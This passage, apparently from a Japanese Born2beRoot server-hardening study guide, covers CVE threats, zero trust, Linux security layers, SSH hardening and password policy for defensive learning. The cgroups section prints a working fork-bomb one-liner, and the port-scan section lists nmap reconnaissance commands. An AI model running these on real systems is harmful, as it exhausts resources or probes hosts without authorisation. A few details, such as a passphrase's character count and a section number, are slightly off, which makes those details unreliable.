|-------------|-----------|---------|-------------------|------|
| SSH ブルートフォース | ボットネット攻撃 | port 22 への自動パスワード試行 | ポート変更 + パスワードポリシー | 毎日数千〜数万回発生 |
| 権限昇格 | CVE-2016-5195 (Dirty COW) | カーネルの COW メカニズムの競合条件を悪用 | AppArmor + sudo 制限 + パッチ適用 | 2007年から存在した脆弱性 |
| sudo 脆弱性 | CVE-2021-3156 (Baron Samedit) | sudoedit のバッファオーバーフロー | sudo の更新 + 多層防御 | 10年以上潜んでいた |
| SSH プロトコル | CVE-2023-48795 (Terrapin) | SSH ハンドシェイクの改ざん | OpenSSH 更新 | プロトコルレベルの脆弱性 |
| 物理的盗難 | データセンター侵入 | ハードディスクの物理的な盗難 | LUKS 暗号化 (AES-256) | 暗号化されていれば解読不可能 |
| ログ改ざん | 侵入後の証拠隠滅 | /var/log の削除・書き換え | 別パーティション + sudo ログ | 別パーティションなら改ざんが困難 |
| ディスク容量枯渇 | Log Flooding | 認証失敗を大量生成してログを膨張 | パーティション分離 | / の容量枯渇を防止 |
| Web Shell | PHP/CGI 経由の RCE | Web 脆弱性からシェルコマンド実行 | requiretty + GUI なし | Web サーバーがなければ発生しない |

### 8.2 CVE-2016-5195 (Dirty COW) の詳細

```
名前: Dirty COW (Copy-On-Write)
CVE: CVE-2016-5195
発見日: 2016年10月
CVSS: 7.8 (High)
影響: 2007年以降の全 Linux カーネル

攻撃の原理:
  Linux カーネルの Copy-On-Write (COW) メカニズムに競合条件が存在。
  一般ユーザーが読み取り専用のファイル（例: /etc/passwd）を
  書き換えることが可能だった。

攻撃の影響:
  → /etc/passwd の root エントリを書き換え
  → root 権限を取得
  → 全データにアクセス可能

Born2beRoot での防御:
  1. カーネルの更新（apt upgrade で修正版を適用）
  2. AppArmor でプロセスのファイルアクセスを制限
  3. /etc/passwd, /etc/shadow のパーミッション管理
  4. 監視ログで異常なファイル変更を検知
```

---

## 9. ゼロトラストモデルとの比較

### 9.1 従来のセキュリティモデル（境界型セキュリティ）

Born2beRoot のセキュリティモデルは**境界型セキュリティ**（Perimeter Security）の考え方に近い。

```
境界型セキュリティ（Born2beRoot のモデル）:
  → UFW で「外」と「内」を明確に分ける
  → 「外」からのアクセスは制限する
  → 「内」に入った後は比較的自由
  → 城壁モデル: 壁の中は安全、壁の外は危険

  ┌─────────── 境界（UFW）───────────┐
  │                                    │
  │   ┌─────┐  ┌─────┐  ┌─────────┐ │
  │   │ SSH │  │ cron│  │ monitor │ │
  │   └─────┘  └─────┘  └─────────┘ │
  │        内部ネットワーク            │
  │        （比較的信頼される）        │
  └────────────────────────────────────┘
                    ↑
              UFW がフィルタリング
                    ↑
              外部ネットワーク（信頼されない）
```

### 9.2 ゼロトラストモデル

ゼロトラスト（Zero Trust）は「何も信頼しない、常に検証する」というセキュリティモデル。Google が BeyondCorp として実装したことで広く知られるようになった。

```
ゼロトラストの原則:
  1. Never Trust, Always Verify（決して信頼せず、常に検証する）
  2. Least Privilege Access（最小権限アクセス）
  3. Assume Breach（侵害を前提とする）

ゼロトラストモデル:
  → 「内部」と「外部」の区別をしない
  → 全てのアクセスを検証する
  → ネットワークの位置に関係なく認証・認可を行う

  ┌─────────────────────────────────────┐
  │            Identity Provider         │
  │     (認証・認可の中央管理)            │
  └──────────┬──────────┬───────────────┘
             │          │
    ┌────────▼───┐  ┌───▼────────┐
    │  SSH        │  │  cron      │
    │  認証: 毎回 │  │  認可: 毎回│
    │  検証: 常時 │  │  検証: 常時│
    └────────────┘  └────────────┘
```

### 9.3 Born2beRoot との比較

| 項目 | Born2beRoot (境界型) | ゼロトラスト |
|------|---------------------|-------------|
| 信頼モデル | 境界の内側は信頼 | 何も信頼しない |
| 認証 | 境界突破時に1回 | 毎回検証 |
| ネットワーク | UFW で内外を分離 | ネットワーク位置は無関係 |
| 権限 | sudo で管理 | 動的な認可 (ABAC) |
| 監視 | monitoring.sh | 継続的な監視・分析 |
| 暗号化 | LUKS (保存データ) | 全通信を暗号化 |
| 適用範囲 | 単一サーバー | 組織全体 |

### 9.4 Born2beRoot にゼロトラスト要素を追加するなら

Born2beRoot の設定にゼロトラスト的な要素を追加するとしたら:

```
1. SSH 公開鍵認証 + パスワード認証の二段階
   → 「知っているもの」+ 「持っているもの」のMFA（多要素認証）

2. 証明書ベースの SSH 認証
   → 短期証明書を発行し、定期的に更新
   → 長期鍵の漏洩リスクを軽減

3. Just-In-Time (JIT) アクセス
   → 必要な時だけ sudo 権限を付与、一定時間後に自動失効
   → sudo ALL=(ALL) ALL ではなく、動的な権限管理

4. 継続的な監視と異常検知
   → monitoring.sh の拡張: ベースラインからの逸脱を自動検知
   → ユーザーの行動パターンを学習し、異常をアラート
```

---

## 10. Linux セキュリティモデルの全体像

```
┌──────────────────────────────────────────────┐
│ Application Layer                             │
│  ┌────────┐  ┌────────┐  ┌────────────────┐ │
│  │  sshd  │  │  cron  │  │ monitoring.sh  │ │
│  └────┬───┘  └────┬───┘  └───────┬────────┘ │
├───────┼───────────┼──────────────┼───────────┤
│ Security Layer                                │
│                                               │
│  1. DAC (Discretionary Access Control)        │
│     rwxr-xr-x  owner:group                   │
│     └─ ファイル所有者が権限を制御            │
│     └─ Born2beRoot: /etc/shadow は 640       │
│                                               │
│  2. Linux Capabilities                        │
│     CAP_NET_BIND_SERVICE (port<1024)          │
│     CAP_SYS_ADMIN (mount等)                  │
│     └─ root 権限を約 40 の粒度に分割        │
│     └─ Born2beRoot: SSH が port 4242 を使用  │
│        (1024以上なので CAP 不要)              │
│                                               │
│  3. LSM (Linux Security Modules)              │
│     ┌─────────────┐  ┌──────────────┐        │
│     │  AppArmor   │  │   SELinux    │        │
│     │ (パスベース) │  │ (ラベルベース)│       │
│     └─────────────┘  └──────────────┘        │
│     └─ プロセスごとのアクセスをポリシー制御  │
│     └─ Born2beRoot: AppArmor を使用          │
│                                               │
│  4. Netfilter (Network Security)              │
│     UFW → iptables → nftables → Netfilter    │
│     └─ パケットフィルタリング                │
│     └─ Born2beRoot: port 4242 のみ許可       │
│                                               │
│  5. Cryptographic Layer                       │
│     LUKS/dm-crypt → AES-256-XTS              │
│     SSH → AES-256-GCM + Ed25519/curve25519   │
│     Passwords → SHA-512 + salt + rounds       │
│     └─ データの暗号化                        │
│     └─ Born2beRoot: LUKS + SSH + SHA-512      │
│                                               │
│  6. PAM (Pluggable Authentication Modules)    │
│     pam_pwquality (パスワード品質)            │
│     pam_faillock (ログイン試行制限)           │
│     pam_tally2 (認証失敗カウント)             │
│     └─ Born2beRoot: pam_pwquality を設定     │
├───────────────────────────────────────────────┤
│ Kernel Layer                                  │
│  Process Isolation (namespaces, cgroups)       │
│  Memory Protection (ASLR, NX bit, KASLR)     │
│  System Call Filtering (seccomp)              │
│  └─ カーネルレベルの保護機構                 │
│  └─ Born2beRoot: Debian カーネルのデフォルト  │
└───────────────────────────────────────────────┘
```

### 10.1 AppArmor vs SELinux

| 項目 | AppArmor (Born2beRoot) | SELinux (RHEL/CentOS) |
|------|----------------------|----------------------|
| アクセス制御方式 | パスベース | ラベルベース |
| 設定の容易さ | 比較的容易 | 複雑 |
| プロファイル | ファイルパスで定義 | セキュリティコンテキストで定義 |
| デフォルト | Debian/Ubuntu | RHEL/CentOS/Fedora |
| 粒度 | 中程度 | 非常に細かい |
| 学習曲線 | 低〜中 | 高 |
| 使用例 | Born2beRoot | 金融機関、政府機関 |

```
AppArmor プロファイルの例（sshd）:

/usr/sbin/sshd {
  # 読み取り許可
  /etc/ssh/** r,
  /etc/passwd r,
  /etc/shadow r,

  # 書き込み許可
  /var/log/auth.log w,
  /var/run/sshd.pid w,

  # ネットワーク
  network inet stream,
  network inet6 stream,

  # その他のファイルアクセスは拒否
}
```

---

## 11. CIS Benchmark と Born2beRoot

CIS (Center for Internet Security) Benchmark は、サーバーのセキュリティ設定の業界標準ガイドラインである。Born2beRoot の設定と CIS Benchmark の推奨事項を比較する。

| CIS Benchmark 推奨 | Born2beRoot の対応 | 状態 |
|-------------------|-------------------|:----:|
| ファイアウォールの有効化 | UFW を有効化 | ○ |
| 不要なサービスの無効化 | GUI なし、最小インストール | ○ |
| SSH root ログインの禁止 | PermitRootLogin no | ○ |
| SSH のポート変更 | Port 4242 | ○ |
| パスワードの複雑さ要件 | pam_pwquality | ○ |
| パスワードの有効期限 | PASS_MAX_DAYS 30 | ○ |
| sudo ログの有効化 | log_input, log_output | ○ |
| ディスク暗号化 | LUKS | ○ |
| MAC (Mandatory Access Control) | AppArmor | ○ |
| /tmp の分離 | 別パーティション | ○ (Bonus) |
| 自動セキュリティ更新 | - | △ (手動) |
| Fail2ban / IP制限 | - | × (スコープ外) |
| SSH 公開鍵認証 | - | △ (パスワード認証) |
| 監査ログ (auditd) | sudo ログ | △ (部分的) |

Born2beRoot は教育目的のプロジェクトだが、CIS Benchmark の多くの推奨事項を満たしている。これは、Born2beRoot の要件が実際のセキュリティベストプラクティスに基づいて設計されていることを示している。

---

## 12. カーネルレベルのセキュリティ機構

### 12.1 ASLR (Address Space Layout Randomization)

ASLR はプロセスのメモリレイアウトをランダム化することで、バッファオーバーフローなどのメモリ破壊攻撃を困難にする技術である。

```
ASLR なし（メモリアドレスが固定）:
  Stack:  0x7fff0000 ← 攻撃者が事前に知っている
  Heap:   0x08040000 ← 攻撃者が事前に知っている
  Libs:   0x40000000 ← 攻撃者が事前に知っている

  → バッファオーバーフローで特定のアドレスにジャンプ可能
  → Return-to-libc 攻撃が容易

ASLR あり（メモリアドレスがランダム）:
  Stack:  0x7ffd2a3b0000 ← 毎回ランダム
  Heap:   0x5564e1200000 ← 毎回ランダム
  Libs:   0x7f8c34100000 ← 毎回ランダム

  → 攻撃者はジャンプ先のアドレスを予測できない
  → 攻撃の成功率が大幅に低下

確認コマンド:
  cat /proc/sys/kernel/randomize_va_space
  → 0: 無効
  → 1: 部分的（スタック、VDSO、共有メモリのみ）
  → 2: 完全（ヒープも含む）← Debian のデフォルト

Born2beRoot での意義:
  → Baron Samedit (CVE-2021-3156) のようなヒープオーバーフロー攻撃に対して、
    ASLR があることで攻撃の成功率が低下する
  → ただし ASLR 単独では不十分（情報漏洩と組み合わせてバイパスされうる）
  → 多層防御の一層として機能する
```

### 12.2 NX bit (No eXecute) / DEP (Data Execution Prevention)

NX bit はメモリ領域に「実行不可」フラグを設定し、スタックやヒープ上のコードの実行を防止する。

```
NX bit なし:
  攻撃者がスタック上にシェルコードを注入
  → スタック上のコードが実行される → シェル取得

NX bit あり:
  攻撃者がスタック上にシェルコードを注入
  → スタックは「実行不可」にマーキングされている
  → 実行しようとすると Segmentation Fault
  → シェルコード実行が阻止される

確認コマンド:
  dmesg | grep NX
  → NX (Execute Disable) protection: active

Born2beRoot での意義:
  → /tmp パーティションの noexec マウントオプションと同じ考え方
  → カーネルレベルとファイルシステムレベルの二重防御
```

### 12.3 seccomp (Secure Computing Mode)

seccomp はプロセスが使用できるシステムコールを制限するカーネル機能である。

```
システムコールの制限:
  プロセスが必要としないシステムコール（execve, ptrace 等）を禁止
  → 攻撃者がシェルを起動しようとしても execve が拒否される
  → デバッガの接続（ptrace）も拒否される

適用例:
  Docker コンテナ: デフォルトで seccomp プロファイルが適用される
  OpenSSH: 認証前のプロセスに seccomp が適用される
  Chromium/Firefox: レンダラープロセスに seccomp が適用される

Born2beRoot での意義:
  → OpenSSH の privsep（権限分離）で seccomp が使用されている
  → SSH 接続の認証前フェーズで不要なシステムコールがブロックされる
  → 攻撃者が SSH の脆弱性を悪用しても、利用できるシステムコールが制限される
```

### 12.4 cgroups (Control Groups)

cgroups はプロセスグループごとにリソース（CPU、メモリ、I/O）を制限する機能である。

```
cgroups が防ぐ攻撃:

1. Fork Bomb:
   :(){ :|:& };:
   → cgroups で最大プロセス数を制限 → Fork Bomb が制御可能に
   → pids コントローラ: pids.max = 1000

2. リソース枯渇攻撃:
   → cpu コントローラ: CPU 使用率を制限
   → memory コントローラ: メモリ使用量を制限
   → 暗号通貨マイニングによるリソース占有を防止

確認コマンド:
  mount | grep cgroup
  cat /proc/cgroups

Born2beRoot での意義:
  → monitoring.sh が CPU load や Memory Usage を監視している
  → cgroups でリソース制限を追加すれば、攻撃の影響を軽減できる
  → Docker/K8s ではこれらが標準的に使用される
```

---

## 13. ネットワークセキュリティの深掘り

### 13.1 Netfilter / iptables / nftables の階層構造

```
Born2beRoot の UFW は以下の階層で動作する:

ユーザーレベル:
  ufw allow 4242/tcp         ← Born2beRoot で操作するレイヤー
       ↓ 変換
  iptables -A INPUT -p tcp --dport 4242 -j ACCEPT
       ↓ 変換（新しいカーネル）
  nftables ルール
       ↓ 適用
  Netfilter（カーネル内のパケットフィルタリングフレームワーク）
       ↓
  ネットワークインターフェース（パケットの送受信）

Netfilter のフック（パケット処理ポイント）:
  ┌──────────────────────────────────────────────┐
  │           Netfilter フック                    │
  │                                              │
  │  パケット受信                                │
  │     │                                        │
  │     ▼                                        │
  │  PREROUTING ──→ ルーティング判断             │
  │                    │        │                │
  │                    ▼        ▼                │
  │               INPUT     FORWARD ──→ POSTROUTING│
  │                 │                        │    │
  │                 ▼                        ▼    │
  │            ローカルプロセス          パケット送信│
  │                 │                              │
  │                 ▼                              │
  │              OUTPUT ──→ POSTROUTING            │
  │                              │                │
  │                              ▼                │
  │                         パケット送信           │
  └──────────────────────────────────────────────┘

Born2beRoot では INPUT チェーンが最も重要:
  → 外部からサーバーに到達するパケットをフィルタリング
  → port 4242/tcp のみ ACCEPT、それ以外は DROP
```

### 13.2 SYN Flood 攻撃と防御

```
SYN Flood 攻撃:
  TCP 3ウェイハンドシェイクの悪用:

  正常な接続:
    Client → SYN → Server
    Client ← SYN+ACK ← Server
    Client → ACK → Server  ← 接続確立

  SYN Flood:
    Attacker → SYN → Server  (大量に送信)
    Attacker ← SYN+ACK ← Server  (サーバーは ACK を待つ)
    (Attacker は ACK を返さない)
    → サーバーの接続テーブルが枯渇 → 正規の接続を受け付けられなくなる

カーネルレベルの防御 (SYN cookies):
  sysctl net.ipv4.tcp_syncookies = 1
  → SYN+ACK にクッキーを埋め込み、接続テーブルを使わずに検証
  → Debian のデフォルトで有効

UFW（Born2beRoot）での追加防御:
  → UFW はデフォルトで rate limiting をサポート
  → ufw limit 4242/tcp  ← 接続レートを制限
  → 短時間に大量の接続が来た場合にブロック
```

### 13.3 ポートスキャン検知

```
攻撃者がまず行うこと: ポートスキャン

nmap による偵察:
  $ nmap -sS target           # SYN スキャン（ステルス）
  $ nmap -p- target           # 全 65535 ポートスキャン
  $ nmap -sV -p 4242 target   # バージョン検出

Born2beRoot でのポートスキャン対策:
  1. UFW で不要なポートを閉鎖 → スキャンで見つかるのは 4242 のみ
  2. SSH のバナー情報を最小化
     → /etc/ssh/sshd_config: DebianBanner no
     → バージョン情報の露出を最小化
  3. monitoring.sh で TCP connections を監視
     → 短時間での多数の接続試行を検知
  4. /var/log/ufw.log でブロックされたパケットを確認
     → ポートスキャンの痕跡を追跡

ポートスキャンの検知例（UFW ログ）:
  [UFW BLOCK] IN=enp0s3 OUT= SRC=10.0.2.1 DST=10.0.2.15
  SPT=12345 DPT=22 PROTO=TCP
  [UFW BLOCK] IN=enp0s3 OUT= SRC=10.0.2.1 DST=10.0.2.15
  SPT=12346 DPT=23 PROTO=TCP
  [UFW BLOCK] IN=enp0s3 OUT= SRC=10.0.2.1 DST=10.0.2.15
  SPT=12347 DPT=80 PROTO=TCP
  → 同一 SRC から連続的に異なるポートへの接続試行 = ポートスキャン
```

---

## 14. SSH プロトコルのセキュリティ

### 14.1 SSH ハンドシェイクの仕組み

```
SSH 接続確立のプロセス:

1. バージョン交換
   Client: SSH-2.0-OpenSSH_9.2p1
   Server: SSH-2.0-OpenSSH_9.2p1 Debian-2

2. アルゴリズムネゴシエーション
   → 鍵交換アルゴリズム: curve25519-sha256
   → ホスト鍵タイプ: ssh-ed25519
   → 暗号化: aes256-gcm@openssh.com
   → MAC: (GCMに含まれる)
   → 圧縮: none

3. 鍵交換 (Key Exchange)
   → Diffie-Hellman (curve25519) で共有秘密を生成
   → 通信路の暗号化に使用するセッション鍵を導出
   → 盗聴者が鍵交換を傍受しても共有秘密は導出不可能

4. サーバー認証
   → サーバーがホスト鍵でハンドシェイクデータに署名
   → クライアントが known_hosts と照合
   → MITM（中間者）攻撃の検知

5. ユーザー認証
   → パスワード認証 or 公開鍵認証
   → Born2beRoot: パスワード認証を使用

6. セッション確立
   → 暗号化された通信路でコマンドを実行
```

### 14.2 SSH ハードニングの追加設定

Born2beRoot の基本要件を超えた、実務で推奨される SSH ハードニング:

| 設定 | 効果 | Born2beRoot | 実務推奨 |
|------|------|:-----------:|:--------:|
| Port 4242 | ボット回避 | ○ | ○ |
| PermitRootLogin no | root 直接ログイン禁止 | ○ | ○ |
| MaxAuthTries 3 | 試行回数制限 | ○ | ○ |
| PubkeyAuthentication yes | 公開鍵認証 | △ | ○ |
| PasswordAuthentication no | パスワード認証無効化 | × | ○ |
| LoginGraceTime 60 | 認証タイムアウト | △ | ○ |
| ClientAliveInterval 300 | アイドルタイムアウト | △ | ○ |
| AllowUsers kaztakam | ユーザー制限 | × | ○ |
| KexAlgorithms (制限) | 弱い鍵交換の無効化 | × | ○ |
| Ciphers (制限) | 弱い暗号の無効化 | × | ○ |
| HostKeyAlgorithms (制限) | 弱いホスト鍵の無効化 | × | ○ |

```
実務での SSH ハードニング設定例:

# 鍵交換アルゴリズムの制限（弱いものを排除）
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org

# 暗号アルゴリズムの制限
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com

# ホスト鍵アルゴリズム
HostKeyAlgorithms ssh-ed25519,rsa-sha2-512

# MAC アルゴリズム（GCM 使用時は不要だが念のため）
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com

→ CVE-2023-48795 (Terrapin) のような攻撃で暗号強度を下げられるリスクを軽減
→ 弱いアルゴリズムが存在しなければ、ダウングレード攻撃が不可能
```

---

## 15. 暗号化の応用と鍵管理

### 15.1 SSH 鍵のアルゴリズム比較

| アルゴリズム | 鍵長 | 安全性 | パフォーマンス | 推奨 |
|-------------|------|--------|--------------|:----:|
| RSA | 2048-4096 bit | 2048: 中, 4096: 高 | 中（鍵長に依存）| △ |
| ECDSA | 256/384/521 bit | 高 | 高 | △ |
| Ed25519 | 256 bit | 非常に高 | 非常に高 | ○ |

```
Ed25519 が推奨される理由:
  1. 固定鍵長（256 bit）で管理が容易
  2. 署名・検証が高速
  3. 実装が単純でサイドチャネル攻撃に強い
  4. NSA の影響を受けない曲線（Curve25519）
  5. 短い公開鍵（68文字）

鍵生成:
  ssh-keygen -t ed25519 -C "kaztakam@42tokyo"

RSA が必要な場合（レガシー互換性）:
  ssh-keygen -t rsa -b 4096 -C "kaztakam@42tokyo"
```

### 15.2 暗号化の完全性（Authenticated Encryption）

```
Born2beRoot で使用される認証付き暗号:

LUKS: AES-256-XTS + HMAC-SHA-256
  → XTS モードでディスクセクターを暗号化
  → HMAC でデータの改ざんを検知
  → 暗号化（機密性）+ 認証（完全性）を同時に提供

SSH: AES-256-GCM (Galois/Counter Mode)
  → GCM はカウンターモードの暗号化 + Galois MAC の認証を統合
  → 1つのアルゴリズムで機密性と完全性を同時に保証
  → 別途 MAC を計算する必要がない（高速）

なぜ「認証」が必要か:
  暗号化だけでは改ざんを検知できない
  → 攻撃者が暗号文を改変 → 復号結果が予測不能な値に変化
  → 認証タグの検証で改ざんを即座に検知・拒否
```

---

## 16. セキュリティ設計のトレードオフ

### 16.1 セキュリティ vs ユーザビリティ

```
セキュリティを上げると使い勝手が下がる（トレードオフ）:

パスワードポリシー:
  セキュリティ最大: 20文字, 全種類必須, 90日ごとに変更
    → ユーザーがパスワードを覚えられず、付箋に書いて貼る（逆効果）
  Born2beRoot: 10文字, 大文字+数字必須, 30日変更
    → 現実的な範囲で妥協

sudo の制限:
  セキュリティ最大: コマンドごとに個別に許可
    → 管理コストが膨大、新しいコマンドのたびに設定変更
  Born2beRoot: ALL=(ALL:ALL) ALL + ログ記録
    → 柔軟性を維持しつつ監査で補完

SSH 認証:
  セキュリティ最大: 公開鍵認証 + MFA + 証明書
    → 初期設定が複雑、鍵の管理が必要
  Born2beRoot: パスワード認証（教育目的で分かりやすさ優先）
    → 実務では公開鍵認証を推奨
```

### 16.2 NIST SP 800-63B のパスワードガイドライン

2017年に NIST が発表した新しいパスワードガイドラインは、従来の常識を覆す内容を含む:

| 従来の推奨 | NIST 新ガイドライン | 理由 |
|-----------|-------------------|------|
| 定期的な変更（90日） | 漏洩時のみ変更 | 定期変更はパターン化を招く |
| 複雑さ要件（大小+記号） | 長さを重視 | 長いパスフレーズの方が強い |
| 最低8文字 | 最低8文字、64文字以上対応 | パスフレーズの使用を推奨 |
| セキュリティの質問 | 使用しない | 答えが推測可能 |

```
Born2beRoot のポリシー vs NIST 新ガイドライン:

Born2beRoot: 10文字 + 複雑さ要件 + 30日変更
  → 従来型のアプローチ
  → 教育目的では各要素を学ぶ意義がある

NIST 推奨: 長いパスフレーズ + 漏洩チェック
  → "correct horse battery staple" (44文字, 約 44 bits)
  → パスワード漏洩データベースとの照合
  → Have I Been Pwned (HIBP) との統合

実務での最適解: 両方の要素を取り入れる
  → 最低12文字 + 漏洩チェック + MFA
  → パスワードマネージャの使用を推奨
  → 定期変更は強制しない（漏洩時のみ）
```

---

## 17. 設計原則のまとめ

Born2beRoot の全要件を設計原則にマッピング:

| 要件 | 最小攻撃面 | 多層防御 | 最小権限 | 関心の分離 | 監視・監査 |
|------|:----------:|:--------:|:--------:|:----------:|:----------:|
| GUI なし | ● | | | | |
| UFW (port 4242のみ) | ● | ● | | | |
| SSH port 変更 | ● | | | | |
| root SSH 禁止 | | ● | ● | | |
| LUKS 暗号化 | | ● | | | |
| LVM パーティション | | | | ● | |
| パスワードポリシー | | ● | | | |
| sudo 制限 | | ● | ● | | |
| sudo ログ | | | | | ● |
| AppArmor | | ● | ● | | |
| monitoring.sh | | | | | ● |
| TTY 必須 | ● | ● | | | |
| secure_path | | ● | ● | | |

### 12.1 設計原則のキーポイント

1. **最小攻撃面**: 不要なものは全て削除する。存在しないソフトウェアには脆弱性もない
2. **多層防御**: 単一の対策を信頼しない。全ての層が突破される可能性を想定する
3. **最小権限**: 必要最小限の権限のみを付与する。root 権限の常時使用は避ける
4. **関心の分離**: システムの各部分を独立させ、障害の影響範囲を限定する
5. **監視・監査**: セキュリティは継続的なプロセス。設定して終わりではない

これらの原則は Born2beRoot に限らず、あらゆるサーバーのセキュリティ設計に適用される普遍的な考え方である。実務では CIS Benchmark や NIST SP 800-53、STIG（Security Technical Implementation Guide）といったハードニングガイドラインに基づいて、これらの原則を体系的に適用する。
